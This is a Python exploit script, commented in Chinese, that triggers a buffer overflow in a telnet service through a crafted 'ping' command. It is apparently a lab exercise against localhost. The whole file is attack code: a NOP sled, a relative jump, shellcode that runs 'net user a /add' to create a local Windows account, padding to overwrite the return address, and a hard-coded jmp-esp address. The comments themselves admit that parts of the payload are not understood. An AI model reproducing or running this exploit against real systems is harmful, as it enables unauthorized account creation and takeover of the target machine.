# 该构造比较短，但是也可以触发CVE漏洞，但是jmp和返回地址后的填充字符串无法解释
import socket
import os

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('127.0.0.1', 23))  # telnet用的是23端口
s = sock.recv(2022)  # 设置接受对方发送的数据字节数量
print(s)

# 构造shellcode
sendStr = b'ping ' + b'\x90' * 4  # 该漏洞的esp就是指向第四个字节
jmp = b'\xE9\x03\xFC\xFF\xFF\x90\x90\x90'  # 从0x012E6700跳到0x012E6308
# shellcode作用是在本地增加一个a帐户
shellcode = b'\x55\x8B\xEC\x33\xFF\x57\x83\xEC\x0C\xC6\x45\xF0\x6E\xC6\x45\xF1\x65\xC6\x45\xF2\x74\xC6\x45\xF3\x20\xC6\x45\xF4\x75\xC6\x45\xF5\x73\xC6\x45\xF6\x65\xC6\x45\xF7\x72\xC6\x45\xF8\x20\xC6\x45\xF9\x61\xC6\x45\xFA\x20\xC6\x45\xFB\x2F\xC6\x45\xFC\x61\xC6\x45\xFD\x64\xC6\x45\xFE\x64\x8D\x45\xF0\x50\xB8\xC7\x93\xBF\x77\xFF\xD0'
# 为了覆盖返回地址的填充
padding = b'a' * 920
# jmpesp = b'\x12\x45\xfa\x7f'     # 指向jmp esp指令的地址0x7ffa4512覆盖ret
jmpesp = b'\xed\x1e\x96\x7c'
# 末尾至少填充16个字符
sendStr = sendStr + jmp + shellcode + padding + jmpesp + b'a' * 16

sock.send(sendStr)  # 发送shellcode
sock.send(b'\n')
s = sock.recv(2022)
print(s)